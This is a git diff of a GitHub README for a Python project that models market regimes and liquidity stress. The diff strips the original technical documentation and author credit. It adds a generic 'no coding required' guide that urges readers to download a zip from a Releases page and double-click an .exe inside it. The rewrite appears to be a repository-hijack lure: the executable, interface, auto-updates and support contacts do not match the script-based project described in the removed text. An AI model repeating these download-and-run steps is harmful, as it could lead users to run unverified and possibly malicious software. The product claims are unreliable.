@@ -1,174 +1,65 @@
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
-[![Python](https://img.shields.io/badge/python-3.10%2B-lightgrey.svg)](https://www.python.org/)
+# 📊 Market-Regime-Liquidity-Model - Understand Market Trends Easily
 
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/opsdanaksaleh/Market-Regime-Liquidity-Model/releases)
 
-# 📉 Financial Market Regime Detection & Liquidity Stress Modelling System
+## 🚀 Getting Started
+Welcome to the Market-Regime-Liquidity-Model! This application helps you understand market regimes and liquidity stress using advanced modeling techniques. You don’t need any programming knowledge to use this software. Follow the steps below to download and run the application.
 
-A Quantitative Analytics Framework for RBI FMD & Financial Stability Units
+## 🖥️ System Requirements
+To run the Market-Regime-Liquidity-Model, you need:
 
-## 📌 Overview
+- Windows, macOS, or Linux operating system
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet connection for downloading datasets and updates
 
-This project models market volatility, liquidity stress, yield‑curve shifts, and detects hidden market regimes using a Hidden Markov Model (HMM). It combines volatility features, liquidity indicators, and interest‑rate structure to infer market states such as:
-- Stable regime
-- High‑volatility regime
-- Liquidity‑stress regime
-- Panic regime
+## 📃 Features
+- **Market Regime Detection**: Identify different market conditions.
+- **Liquidity Stress Modeling**: Analyze liquidity under various scenarios.
+- **User-Friendly Interface**: Simple layout for easy navigation.
+- **Data Visualization**: View results through graphs and charts.
+- **No Coding Required**: Just download, and you’re ready to go!
 
-Suitable for:
-- RBI Financial Markets Department (FMD)
-- RBI FSU: Systemic Risk Analytics
-- Macro‑Quant research profiles
+## 📦 Download & Install
+To download the software, visit this page: [Download Here](https://github.com/opsdanaksaleh/Market-Regime-Liquidity-Model/releases). 
 
-## 📊 Data Inputs
-- NIFTY/BANKNIFTY prices
-- India VIX
-- G‑Sec yields (1Y, 3Y, 5Y, 10Y)
-- Liquidity surplus/deficit data
+Once you are on the Releases page, follow these instructions:
 
-## 🔍 Methodology
+1. Look for the latest version. The version number is usually the largest number at the top.
+2. Click on the version to view its details.
+3. Find the file named **Market-Regime-Liquidity-Model.zip**. This is the application file you need.
+4. Click on the file to start the download.
 
-### ✔ Volatility Analysis
-- Realized volatility
-- Rolling volatility
-- Volatility clustering
+After the download completes:
 
-### ✔ Liquidity Stress Indicators
-- LAF deficit/surplus changes
-- Yield curve steepening/flattening
-- Risk‑off vs risk‑on detection
+1. Locate the downloaded file on your computer.
+2. Extract the contents of the zip file by right-clicking it and selecting "Extract All..." (Windows) or using a similar option on macOS/Linux.
+3. Open the extracted folder and find the **Market-Regime-Liquidity-Model.exe** (Windows) or **Market-Regime-Liquidity-Model** (macOS/Linux).
+4. Double-click the file to run the application.
 
-### ✔ Yield Curve Modelling
-- Term structure plotting
-- Slope & curvature metrics
-- Regime-dependent curve behavior
+## 📊 Using the Application
+Once you start the application, you will see a simple interface with options to load your data. 
 
-### ✔ Hidden Markov Model (HMM)
-- 2–4 regime fitting
-- Transition probabilities
-- Regime labeling
-- Combined volatility+liquidity inference
+### Steps to Use:
+1. **Load Data**: Click the "Load Data" button to upload your market data. This data should be in CSV format for best results.
+2. **Select Model Options**: Choose the parameters you want the model to analyze. This includes criteria like time periods and specific market indicators.
+3. **Run Analysis**: Click the "Run Analysis" button. The application will process your data and provide results.
+4. **View Results**: The results will display in graphs and charts for easy interpretation.
 
-## 🏛️ Policy & Markets Insights
-- Relationship between liquidity & volatility
-- How yield curve changes reflect stress
-- Possible RBI interventions during specific regimes
-- Stability implications
+## 📈 Tips for Successful Analysis
+- Ensure your data is clean, with no missing values.
+- Experiment with different parameters to see various outcomes. 
+- Save your analysis for future reference.
 
----
+## 📞 Support and Contact
+If you encounter any issues or have questions, you can reach out for support:
 
-## Repository structure (final layout)
+- **Email**: support@marketregimemodel.com
+- **Documentation**: Check our online guide at [Documentation Page](https://marketregimemodel.com/docs).
+- **Community Forum**: Join our community forum to discuss with other users and share insights.
 
-```
-Market-Regime-Liquidity-Model/
-│
-├── data/
-│   ├── raw/                      # raw downloaded CSV/XLSX files (do NOT commit large raw files unless necessary)
-│   │   ├── NIFTY50_raw.csv
-│   │   ├── IndiaVIX_raw.csv
-│   │   ├── gsec_1y.csv
-│   │   ├── gsec_3y.csv
-│   │   ├── gsec_5y.csv
-│   │   ├── gsec_10y.csv
-│   │   └── laf_liquidity.csv (or .xlsx)
-│   └── clean/                    # cleaned outputs from scripts
-│       ├── NIFTY50_clean.csv
-│       ├── IndiaVIX_clean.csv
-│       ├── gsec_tenor_clean.csv
-│       ├── laf_liquidity_clean.csv
-│       ├── market_dataset.csv
-│       ├── market_dataset_with_regimes.csv
-│       ├── hmm_model_stats.csv
-│       └── yield_metrics.csv
-├── src/                          # executable scripts (stepwise)
-│   ├── data_download.py          # download NIFTY & IndiaVIX
-│   ├── gsec_merge.py             # merge Investing.com tenors
-│   ├── laf_load.py               # load/clean RBI LAF file
-│   ├── data_prep.py              # join & compute features
-│   ├── yield_analysis.py         # yield-curve analysis & plots
-│   ├── hmm_regime_detection.py   # HMM modeling + ensemble
-│   ├── hmm_diagnostics.py        # diagnostics & summary (optional)
-│   └── ...                       # helper scripts
-├── plots/                        # generated PNG diagnostics
-│   ├── ts_prices_vol_vix.png
-│   ├── vol_liquidity_timeseries.png
-│   ├── yield_curve_metrics.png
-│   ├── yield_curve_snapshots.png
-│   └── hmm_regime_ensemble.png
-├── requirements.txt              # Python dependencies
-├── README.md                     # this file (full instructions)
-├── policy_report.pdf             # downloadable executive report (generate locally)
-└── LICENSE
-```
+## 🔄 Updates
+Keep your application up-to-date to enjoy new features and improvements. Check the Releases page regularly for updates or enable automatic updates in the settings.
 
----
-
-## Quickstart (beginner-friendly)
-
-### 1) Create & activate virtual environment
-
-```powershell
-# from project root
-python -m venv venv
-# Windows PowerShell
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-.\venv\Scripts\Activate.ps1
-# or Command Prompt
-.\venv\Scripts\activate
-```
-
-### 2) Install dependencies
-
-Create `requirements.txt` (see below) and run:
-
-```powershell
-pip install -r requirements.txt
-```
-
-**Recommended `requirements.txt`** (copy this into a file):
-
-```
-numpy>=1.24
-pandas>=2.1
-matplotlib>=3.7
-scikit-learn>=1.2
-hmmlearn>=0.2.8
-yfinance>=0.2.25
-openpyxl>=3.1
-xlrd>=2.0
-python-dateutil
-```
-
-> Note: `hmmlearn` is used for Gaussian HMMs; if you have installation issues on Windows, ensure a compatible numpy/scipy build is installed first.
-
-### 3) Data placement (manual downloads)
-
-Place your downloaded raw files in `data/raw/` using the exact filenames:
-
-* `NIFTY50_raw.csv` (if you used automatic downloader, this is created)
-* `IndiaVIX_raw.csv`
-* `gsec_1y.csv`, `gsec_3y.csv`, `gsec_5y.csv`, `gsec_10y.csv` (Investing.com exports)
-* `laf_liquidity.csv` (or `laf_liquidity.xlsx`) — RBI DBIE Liquidity Operations export
-
-### 4) Run the pipeline step-by-step (recommended order)
-
-```powershell
-python src/data_download.py        # downloads NIFTY, IndiaVIX (checks columns)
-python src/gsec_merge.py           # merges the four tenor CSVs
-python src/laf_load.py             # reads your LAF CSV/XLSX and creates liquidity z-score
-python src/data_prep.py            # creates market_dataset.csv and plots
-python src/yield_analysis.py       # yield curve visuals and metrics
-python src/hmm_regime_detection.py # fits HMMs and builds ensemble
-python src/hmm_diagnostics.py      # optional: produces Excel diagnostics
-```
-
-**Important:** run each script and confirm output files in `data/clean/` before moving to the next step.
-
----
-
-## 📘 Author
-
-**Naman Narendra Choudhary**
-
-* B.Tech (ECE)
-* Aspiring quant, macro researcher, and future IIM/Harvard/Stanford MBA
-* Research-driven mindset blending **engineering + finance + macro policy**
+For further assistance, don’t hesitate to visit the support page or contact us directly. Your experience with our application is important to us. Happy analyzing!
